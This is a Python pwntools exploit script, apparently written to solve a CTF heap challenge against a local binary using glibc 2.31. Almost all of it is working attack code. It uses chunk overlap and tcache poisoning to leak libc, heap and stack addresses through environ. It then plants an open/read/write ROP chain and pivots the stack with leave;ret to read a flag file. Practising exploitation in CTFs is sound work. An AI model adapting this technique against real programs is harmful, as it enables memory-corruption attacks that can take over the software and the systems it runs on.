from pwn import *
context.log_level='debug'
context.terminal = ["/bin/tmux", "sp",'-h']
sh = process('./cl')
libc = ELF('/home/yrl/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6')

def add(idx,size,cont):
	sh.sendline('1')
	sh.sendline(str(size))
	sh.sendline(str(idx))
	sh.send(cont)
def dele(idx):
	sh.sendline('4')
	sh.sendline(str(idx))
def edit(idx,content):
	sh.sendline('2')
	sh.sendline(str(idx))
	sh.send(content)
def show(idx):
	sh.sendline('3')
	sh.sendline(str(idx))

sh.recvuntil('Asuri: ')
libc_down = int(sh.recv(4),16)
sh.recv()
fileno = libc_down  + 0x187900
log.success('fileno: '+hex(fileno))

for i in range(10):
	add(0,0x10,'aaaa\n')
	add(0,0x20,'aaaa\n')
	add(0,0x30,'aaaa\n')
	add(0,0x40,'aaaa\n')
	add(0,0x50,'aaaa\n')
	add(0,0x60,'aaaa\n')
	
# make chunk overlap start
add(0,0,'a\n')

for i in range(10):#1 - 10
	add(i+1,0x60,'b\n')

add(11,0x10,p64(0)+p64(0x21)+b'\n')

edit(0,p64(0)*3+p64(0x461)+b'\n')

# free 2 3 to tcache
dele(3)
dele(2)
# free 1 to unsortedbin
dele(1)
# add from unsortedbin
add(1,0x10,'aaaaaaaa\n')
add(1,0x40,'aaaaaaaa\n')
# edit tcache fd point mainarena
add(1,0x10,'\n')
# pause()
# edit overlap chunk point to fileno
edit(0,p64(0)*3+p64(0x71)+b'a'*0x60+p64(0)+p64(0x71)+ p16(fileno&0xffff) + b'\n' )
# add from tcache[0x70] ,chunk2\chunk1 point one address
add(2,0x60,'\n')
# malloc to fileno and edit it to 2
add(3,0x60,p64(2)+b'\n')

#pause()
sh.recv()

# add from unsortedbin ,overlap chunk2
add(12,0x40,'\n')
sh.recvuntil('>>')
# leak libc
show(12)

sh.recvuntil('\xe0')
libcbase = u64((b'\xe0'+sh.recv(5)).ljust(8,b'\x00')) - 0x1ebbe0
log.success(hex(libcbase))

# tcache attack leak heapbase 
sh.recvuntil('>>')
dele(10)
sh.recvuntil('>>')
dele(2)
sh.recvuntil('>>')
show(1)
heapbase = u64(sh.recv(6).ljust(8,b'\x00'))
log.success(hex(libcbase))

sh.recvuntil('>>')
# edit chunk1 fd to environ
edit(1,p64(libcbase+libc.sym['environ'])+b'\n')
sh.recvuntil('>>')
add(2,0x60,'\n')
sh.recvuntil('>>')
# malloc to environ address
add(10,0x60,'\n')
sh.recvuntil('>>')
# leak environ address
show(10)
stack = u64(sh.recv(6).ljust(8,b'\x00'))
log.success(hex(stack))
sh.recvuntil('>>')
# write './flag' to chunk5
edit(5,'./flag\x00\n')
flag = heapbase + 0x55592c485e30 - 0x55592c486060



# orw
pop_rax = 0x000000000004a550 + libcbase
pop_rdi = 0x0000000000026b72 + libcbase
pop_rsi = 0x0000000000027529 + libcbase
pop_rdx_r12 = 0x000000000011c371 + libcbase
syscall_ret = 0x0000000000066229 + libcbase
ret = 0x0000000000025679 + libcbase
leave_ret = 0x000000000005aa48 + libcbase

pay = p64(pop_rdi) + p64(flag)
pay += p64(pop_rax) + p64(2) + p64(pop_rsi) + p64(0)
pay += p64(syscall_ret)

pay += p64(pop_rdi) + p64(1)
pay += p64(pop_rsi) + p64(heapbase+0x1000) #buf
pay += p64(pop_rdx_r12) + p64(0x200) + p64(0)
pay += p64(pop_rax) + p64(0)
pay += p64(syscall_ret)#read(1,buf,size)

pay += p64(pop_rdi) + p64(2)
pay += p64(pop_rsi) + p64(heapbase+0x1000)
pay += p64(pop_rdx_r12) + p64(0x200) + p64(0)
pay += p64(pop_rax) + p64(1)
pay += p64(syscall_ret)#write(2,buf,size)




# make tcache attack to malloc/write anywhere
sh.recvuntil('>>')
dele(9)
sh.recvuntil('>>')
dele(2)
sh.recvuntil('>>')
edit(1,p64(heapbase+0x800)+b'\n')
sh.recvuntil('>>')
add(2,0x60,'\n')
sh.recvuntil('>>')
add(9,0x60,pay[0:0x60]+b'\n')

sh.recvuntil('>>')
dele(8)
sh.recvuntil('>>')
dele(2)
sh.recvuntil('>>')
edit(1,p64(heapbase+0x800+0x60)+b'\n')
sh.recvuntil('>>')
add(2,0x60,'\n')
sh.recvuntil('>>')
add(8,0x60,pay[0x60:0x60*2]+b'\n')

sh.recvuntil('>>')
dele(7)
sh.recvuntil('>>')
dele(2)
sh.recvuntil('>>')
edit(1,p64(heapbase+0x800+0x60*2)+b'\n')
sh.recvuntil('>>')
add(2,0x60,'\n')
sh.recvuntil('>>')
add(7,0x60,pay[0x60*2:]+b'\n')

rbp = stack + 0x7ffc43f87820 - 0x7ffc43f87948
log.success(hex(stack))
sh.recvuntil('>>')
dele(6)
sh.recvuntil('>>')
dele(2)
sh.recvuntil('>>')
edit(1,p64(rbp)+b'\n')
sh.recvuntil('>>')
add(2,0x60,'\n')
sh.recvuntil('>>')

gdb.attach(sh)
# stack leave ret
add(6,0x60,p64(heapbase+0x800-8)+p64(leave_ret)+b'\n')


log.success('h:'+hex(heapbase))
log.success('s:'+hex(stack))
sh.interactive()
